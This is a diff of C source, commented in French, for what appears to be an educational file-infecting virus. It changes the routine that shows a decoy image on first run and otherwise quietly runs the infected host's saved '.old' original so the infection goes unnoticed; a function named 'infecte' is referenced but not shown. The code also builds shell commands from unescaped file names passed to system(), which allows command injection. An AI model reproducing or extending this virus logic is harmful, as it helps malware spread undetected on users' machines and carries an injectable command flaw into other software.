@@ -125,42 +125,48 @@ void infecte(char **files, const char *cheminVirus) {
  * ------------------------------------------------------- */
 void execution(const char *arg) {
 
-    // BUG CORRIGÉ : utiliser strstr sur le basename, pas sur le chemin complet
-    // arg peut valoir "./MonPG1", "/home/user/MonPG1", etc.
-    const char *base = strrchr(arg, '/');
-    base = (base != NULL) ? base + 1 : arg;
+    char *slash = strrchr(arg, '/');
+    char *base;
+
+    if (slash != NULL) {
+        base = slash + 1;
+    } else {
+        base = (char *)arg;
+    }
 
     if (strcmp(base, VIRUS_NAME) == 0) {
-        // Primo-infection : ouvrir une image pour faire service
         printf("Service : affichage d'une image...\n");
-        DIR *d = opendir(".");
+
+        DIR *d = opendir("../images");  // ← ICI on pointe vers images/
         struct dirent *dir;
-        if (d) {
+
+        if (d != NULL) {
             while ((dir = readdir(d)) != NULL) {
-                if ((strstr(dir->d_name, ".jpg")  ||
-                     strstr(dir->d_name, ".jpeg") ||
-                     strstr(dir->d_name, ".png")  ||
-                     strstr(dir->d_name, ".bmp"))
-                    && !strstr(dir->d_name, ".old"))
-                {
+
+                int estImage = 0;
+                if (strstr(dir->d_name, ".jpg")  != NULL) estImage = 1;
+                if (strstr(dir->d_name, ".jpeg") != NULL) estImage = 1;
+                if (strstr(dir->d_name, ".png")  != NULL) estImage = 1;
+                if (strstr(dir->d_name, ".bmp")  != NULL) estImage = 1;
+
+                if (estImage && strstr(dir->d_name, ".old") == NULL) {
                     char cmd[512];
                     snprintf(cmd, sizeof(cmd),
-                             "xdg-open \"./%s\" > /dev/null 2>&1", dir->d_name);
+                             "xdg-open \"../images/%s\" > /dev/null 2>&1", dir->d_name); // ← ET ICI
                     system(cmd);
                     break;
                 }
             }
             closedir(d);
         }
+
     } else {
-        // Infections ultérieures : exécuter le vrai programme (.old)
         char progOld[512];
         snprintf(progOld, sizeof(progOld), "\"%s.old\"", arg);
         printf("Transfert d'exécution vers : %s\n", progOld);
         system(progOld);
     }
 }
-
 /* -------------------------------------------------------
  * Point d'entrée
  * ------------------------------------------------------- */
